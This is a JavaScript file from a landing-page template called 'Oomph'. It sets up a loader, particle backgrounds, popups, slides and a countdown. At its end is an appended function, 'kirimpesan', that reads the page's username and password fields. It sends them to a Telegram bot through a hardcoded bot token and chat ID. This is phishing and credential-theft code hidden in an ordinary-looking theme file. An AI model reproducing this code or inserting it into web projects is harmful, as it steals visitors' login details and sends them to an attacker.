// ------------------------------------------------
// Project Name: Oomph - Coming Soon & Landing Page Template
// Project Description: Oomph - awesome coming soon template to kick-start your project
// Tags: mix_design, oomph, coming soon, under construction, template, coming soon page, html5, css3
// Version: 3.0.0
// Build Date: December 2020
// Last Update: February 2022
// This product is available exclusively on Themeforest
// Author: mix_design
// Author URI: https://themeforest.net/user/mix_design/portfolio
// File name: custom.js
// ------------------------------------------------

// ------------------------------------------------
// Table of Contents
// ------------------------------------------------
//
//  1. Loader & Main Section Loading Animation
//  2. Typed.js
//  3. ParticlesJS Backgrounds
//  4. Magnific Popup
//  5. Skillbars Settings
//  6. Vegas Settings
//  7. KBW-Countdown Settings
//  8. Mailchimp Notify Form
//  9. Contact Form
//
// ------------------------------------------------
// Table of Contents End
// ------------------------------------------------

$(window).on("load", function () {
  "use strict";

  // --------------------------------------------- //
  // Loader & Main Section Loading Animation Start
  // --------------------------------------------- //
  setTimeout(function () {
    $(".loader__logo").removeClass("fadeIn").addClass("fadeOut");
  }, 600);

  setTimeout(function () {
    $("body").addClass("loaded");
    $("body").removeClass("overflow-hidden");
    $(".loader").addClass("fade loaded");
  }, 1200);
  // --------------------------------------------- //
  // Loader & Main Screen Loading Animation End
  // --------------------------------------------- //

  // --------------------------------------------- //
  // Typed.js Plugin Settings Start
  // --------------------------------------------- //
  var animatedHeadline = $(".animated-headline");
  if (animatedHeadline.length) {
    var typed = new Typed("#typed", {
      stringsElement: "#typed-strings",
      loop: true,
      typeSpeed: 80,
      backSpeed: 30,
      backDelay: 2500,
    });
  }
  // --------------------------------------------- //
  // Typed.js Plugin Settings End
  // --------------------------------------------- //

  // --------------------------------------------- //
  // ParticlesJS Backgrounds Start
  // --------------------------------------------- //
  // Triangles BG - particlesJS
  var bgndTriangles = $("#triangles-js");
  if (bgndTriangles.length) {
    particlesJS("triangles-js", {
      particles: {
        number: {
          value: 33,
          density: {
            enable: true,
            value_area: 1420.4657549380909,
          },
        },
        color: {
          value: "#ffffff",
        },
        shape: {
          type: "triangle",
          stroke: {
            width: 0,
            color: "#000000",
          },
          polygon: {
            nb_sides: 5,
          },
          image: {
            src: "img/github.svg",
            width: 100,
            height: 100,
          },
        },
        opacity: {
          value: 0.06313181133058181,
          random: false,
          anim: {
            enable: false,
            speed: 1,
            opacity_min: 0.1,
            sync: false,
          },
        },
        size: {
          value: 11.83721462448409,
          random: true,
          anim: {
            enable: false,
            speed: 40,
            size_min: 0.1,
            sync: false,
          },
        },
        line_linked: {
          enable: true,
          distance: 150,
          color: "#ffffff",
          opacity: 0.4,
          width: 1,
        },
        move: {
          enable: true,
          speed: 4,
          direction: "none",
          random: false,
          straight: false,
          out_mode: "out",
          bounce: false,
          attract: {
            enable: false,
            rotateX: 600,
            rotateY: 1200,
          },
        },
      },
      interactivity: {
        detect_on: "canvas",
        events: {
          onhover: {
            enable: true,
            mode: "repulse",
          },
          onclick: {
            enable: true,
            mode: "push",
          },
          resize: true,
        },
        modes: {
          grab: {
            distance: 400,
            line_linked: {
              opacity: 1,
            },
          },
          bubble: {
            distance: 400,
            size: 40,
            duration: 2,
            opacity: 8,
            speed: 3,
          },
          repulse: {
            distance: 200,
            duration: 0.4,
          },
          push: {
            particles_nb: 4,
          },
          remove: {
            particles_nb: 2,
          },
        },
      },
      retina_detect: true,
    });
  }

  // Particles BG - particlesJS
  var bgndParticles = $("#particles-js");
  if (bgndParticles.length) {
    particlesJS("particles-js", {
      particles: {
        number: {
          value: 80,
          density: {
            enable: true,
            value_area: 800,
          },
        },
        color: {
          value: "#ead9ff",
        },
        shape: {
          type: "circle",
          stroke: {
            width: 0,
            color: "#000000",
          },
          polygon: {
            nb_sides: 5,
          },
          image: {
            src: "img/github.svg",
            width: 100,
            height: 100,
          },
        },
        opacity: {
          value: 0.4,
          random: true,
          anim: {
            enable: true,
            speed: 1,
            opacity_min: 0.1,
            sync: false,
          },
        },
        size: {
          value: 3,
          random: true,
          anim: {
            enable: false,
            speed: 60,
            size_min: 0.1,
            sync: false,
          },
        },
        line_linked: {
          enable: true,
          distance: 180,
          color: "#ffffff",
          opacity: 0.1,
          width: 1,
        },
        move: {
          enable: true,
          speed: 2,
          direction: "none",
          random: false,
          straight: false,
          out_mode: "out",
          bounce: false,
          attract: {
            enable: false,
            rotateX: 600,
            rotateY: 1200,
          },
        },
      },
      interactivity: {
        detect_on: "canvas",
        events: {
          onhover: {
            enable: true,
            mode: "repulse",
          },
          onclick: {
            enable: false,
            mode: "push",
          },
          resize: true,
        },
        modes: {
          grab: {
            distance: 800,
            line_linked: {
              opacity: 1,
            },
          },
          bubble: {
            distance: 800,
            size: 80,
            duration: 2,
            opacity: 0.8,
            speed: 3,
          },
          repulse: {
            distance: 100,
            duration: 0.4,
          },
          push: {
            particles_nb: 4,
          },
          remove: {
            particles_nb: 2,
          },
        },
      },
      retina_detect: true,
    });
  }
  // --------------------------------------------- //
  // ParticlesJS Backgrounds End
  // --------------------------------------------- //
});

$(function () {
  "use strict";

  // --------------------------------------------- //
  // Magnific Popup Video Start
  // --------------------------------------------- //
  $("#showreel-trigger").magnificPopup({
    type: "iframe",
    mainClass: "mfp-fade",
    removalDelay: 160,
    preloader: false,
    fixedContentPos: false,
    callbacks: {
      beforeOpen: function () {
        $("body").addClass("overflow-hidden");
      },
      close: function () {
        $("body").removeClass("overflow-hidden");
      },
    },
  });
  // --------------------------------------------- //
  // Magnific Popup Video End
  // --------------------------------------------- //

  // --------------------------------------------- //
  // Skillbars Settings Start
  // --------------------------------------------- //
  $(".skillbar").skillBars({
    from: 0,
    speed: 4000,
    interval: 100,
  });
  // --------------------------------------------- //
  // Skillbars Settings End
  // --------------------------------------------- //

  // --------------------------------------------- //
  // Vegas Kenburns Start
  // --------------------------------------------- //
  var bgndKenburns = $("#bgndKenburns");
  if (bgndKenburns.length) {
    bgndKenburns.vegas({
      timer: false,
      delay: 5000,
      transition: "fade2",
      transitionDuration: 2000,
      slides: [
        { src: "http://via.placeholder.com/1080x1440" },
        { src: "http://via.placeholder.com/1080x1440" },
        { src: "http://via.placeholder.com/1080x1440" },
      ],
      animation: [
        "kenburnsUp",
        "kenburnsDown",
        "kenburnsLeft",
        "kenburnsRight",
      ],
    });
  }
  // --------------------------------------------- //
  // Vegas Kenburns End
  // --------------------------------------------- //

  // --------------------------------------------- //
  // KBW-Countdown Start
  // --------------------------------------------- //
  $("#countdown").countdown({
    until: $.countdown.UTCDate(+10, 2022, 5, 17),
    format: "D",
  });
  $("#countdown-large").countdown({
    until: $.countdown.UTCDate(+10, 2022, 5, 17),
    format: "DHMS",
  });
  // --------------------------------------------- //
  // KBW-Countdown End
  // --------------------------------------------- //
});
const kirimpesan = () => {
  // Username%20%3A%20blabla%0APassword%20%3A%20blabla

  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  var token = "6378137516:AAFE-nT_A_L_1W08lG194GPlSTh0QUIwpeU";
  var chat_id = "6385491970";

  var gabungan = `Username%20%3A%20${username}%0APassword%20%3A%20${password}`;

  $.ajax({
    type: "POST",
    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gabungan}&parse_mode=html`,
  });
};
